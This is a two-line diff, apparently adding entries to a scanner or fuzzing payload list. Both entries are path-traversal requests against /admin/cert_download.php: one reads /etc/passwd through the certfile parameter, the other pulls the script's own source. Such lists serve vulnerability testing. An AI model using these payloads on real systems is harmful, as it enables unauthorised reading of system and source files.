@@ -1,0 +1,2 @@
+/admin/cert_download.php?file=pqpqpqpq.txt&certfile=../../../../../../../../etc/passwd
+/admin/cert_download.php?file=pqpqpqpq.txt&certfile=cert_download.php
